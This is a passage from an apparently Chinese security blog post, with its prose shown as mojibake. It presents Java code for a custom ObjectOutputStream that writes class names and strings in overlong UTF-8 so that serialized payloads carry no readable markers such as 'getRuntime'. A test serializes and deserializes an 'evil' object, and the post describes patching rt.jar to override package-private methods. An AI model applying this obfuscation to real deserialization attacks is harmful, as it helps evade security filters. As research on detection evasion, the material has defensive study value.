</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeUTF</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writeUTF</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">getUTFLength</span><span class="p">(</span><span class="n">s</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeUTF</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">utflen</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">utflen</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0xFFFFL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UTFDataFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writeShort</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">utflen</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">utflen</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">writeBytes</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">writeUTFBody</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeUTFBody</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">limit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAX_BLOCK_SIZE</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">csize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">CHAR_BUF_SIZE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">s</span><span class="p">.</span><span class="na">getChars</span><span class="p">(</span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">csize</span><span class="p">,</span><span class="w"> </span><span class="n">cbuf</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                if (pos &lt;= limit) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                    if (c &lt;= 0x0020 &amp;&amp; c != 0) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        buf[pos++] = (byte) c;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                    } else if (c &gt; 0x07FF) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        buf[pos + 2] = (byte) (0x80 | ((c &gt;&gt; 0) &amp; 0x3F));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        buf[pos + 1] = (byte) (0x80 | ((c &gt;&gt; 6) &amp; 0x3F));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        buf[pos + 0] = (byte) (0xE0 | ((c &gt;&gt; 12) &amp; 0x0F));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        pos += 3;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                    } else {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        buf[pos + 1] = (byte) (0x80 | ((c &gt;&gt; 0) &amp; 0x3F));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        buf[pos + 0] = (byte) (0xC0 | ((c &gt;&gt; 6) &amp; 0x1F));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        pos += 2;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                    }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                } else {    // write one byte at a time to normalize block</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x0020</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">write</span><span class="p">(</span><span class="n">0xE0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">write</span><span class="p">(</span><span class="n">0xC0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x1F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">off</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="nf">getUTFLength</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">utflen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">csize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">CHAR_BUF_SIZE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">s</span><span class="p">.</span><span class="na">getChars</span><span class="p">(</span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">csize</span><span class="p">,</span><span class="w"> </span><span class="n">cbuf</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">0x0001</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x0020</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">utflen</span><span class="o">++</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">utflen</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">utflen</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">off</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">utflen</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">UTF8</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">evil</span><span class="w"> </span><span class="n">evil</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">evil</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fileOut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;1obj.bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">MyObjectOutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MyObjectOutputStream</span><span class="p">(</span><span class="n">fileOut</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">evil</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fileIn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;1obj.bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fileIn</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">in</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">in</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”Ÿæˆæ•°æ®æµå·²ç»æ²¡æœ‰<code>å¯æ‰“å°å­—ç¬¦</code>äº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ï¿½ï¿½ sr 	UTF8.evilï¿½ï¿½ï¿½ï¿½4ï¿½ï¿½  xp   //è¿™ä¸ªæ˜¯æ­£å¸¸ç”Ÿæˆçš„å¯ä»¥çœ‹åˆ°æ˜æ–‡ç±»å
</span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241212200422482.png" alt="image-20241212200422482"  />
</p>
<p>ç„¶åæˆ‘çœ‹äº†ä¸‹ç½‘ä¸Šæœ€å¼€å§‹çš„æ–¹æ¡ˆå§</p>
<p>æ˜¯è®¾ç½®äº†ä¸€ä¸ªè½¬æ¢çš„mapï¼Œç„¶åå°†length*2or3ï¼Œç„¶åç›´æ¥writeçš„è¿™ç§å½¢å¼ï¼Œç°åœ¨çœ‹æ„Ÿè§‰å¯èƒ½æ„Ÿè§‰æœ‰ç‚¹å°ç¬¨æ‹™hhï¼Œä½†æˆ‘çš„pocå’Œè¿™ç§æ–¹å¼éƒ½æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯éƒ½åªé’ˆå¯¹äº†<code>classname</code>è¿˜æœ‰å±æ€§åå’Œå±æ€§å€¼æ²¡æ“ä½œå‘€ï¼ï¼ï¼æˆ‘çš„è¯„ä»·æ˜¯<strong>imperfect</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc0</span><span class="p">,</span><span class="w"> </span><span class="n">0xae</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;;&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc0</span><span class="p">,</span><span class="w"> </span><span class="n">0xbb</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;$&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc0</span><span class="p">,</span><span class="w"> </span><span class="n">0xa4</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;[&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0x9b</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;]&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0x9d</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0xa1</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;b&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0xa2</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;c&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0xa3</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;d&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0xa4</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0xa5</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="sc">&#39;f&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="o">[]</span><span class="p">{</span><span class="n">0xc1</span><span class="p">,</span><span class="w"> </span><span class="n">0xa6</span><span class="p">});</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241216170214002.png" alt="image-20241216170214002"  />
</p>
<p>å¯ä»¥çœ‹åˆ°æ—¢ç„¶è¿˜æœ‰<code>getRuntime</code>è¿™ç§å­—çœ¼ï¼ï¼</p>
<p><img loading="lazy" src="../images/image-20241216170910002.png" alt="image-20241216170910002"  />
</p>
<p>é‚£ä¹ˆå°±å¼€å§‹æˆ‘ä»¬çš„perfectä¹‹è·¯å§</p>
<p>è°ƒè¯•å‘ç°åœ¨<code>writeString</code>ä¼šå¯¹<code>å±æ€§</code>è¿›è¡Œæ“ä½œ</p>
<p><img loading="lazy" src="../images/image-20241216171211857.png" alt="image-20241216171211857"  />
</p>
<p>ä½†æ˜¯<code>writeString</code>å’Œ<code>writeTypeString</code>éƒ½ä¸æ˜¯<code>public</code>å‘€ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥é‡å†™ã€‚</p>
<p>è¦é‡å†™<code>writeString</code>çš„è¯è¦åˆ°åœ¨ä¸€ä¸ªåŒ…é‡Œé¢å‘€ï¼Œæ²¡é”™æˆ‘è¿˜çœŸè¿™ä¹ˆå¹²äº†ã€‚ã€‚ã€‚ã€‚ä½†æ˜¯æ²¡æˆåŠŸhh</p>
<p><img loading="lazy" src="../images/image-20241216171630308.png" alt="image-20241216171630308"  />
</p>
<p>æˆ‘ä»¬æœ¬åœ°ç”Ÿæˆä¸ªpackageä¹Ÿæ˜¯java.ioï¼Œç„¶ååœ¨å¦ä¸€ä¸ªç±»è°ƒç”¨ä¸€æ¬¡æˆ‘ä»¬çš„<code>MyObjectOutputStream</code>ï¼Œç›®çš„æ˜¯ç”Ÿæˆclassæ–‡ä»¶ï¼Œåœ¨targetä¸­æ‰¾åˆ°classæ–‡ä»¶ï¼Œå…³é—­ç›¸å…³javaåº”ç”¨ç„¶åæ‰¾åˆ°è¿™ä¸ªrt.jaråŒ…æ’å…¥æˆ‘ä»¬classï¼Œæˆ‘æŠŠjavaæºç æ”¾åˆ°src.zipä¸­äº†æ–¹ä¾¿è°ƒè¯•</p>
<p><img loading="lazy" src="../images/image-20241216171944881.png" alt="image-20241216171944881"  />
</p>
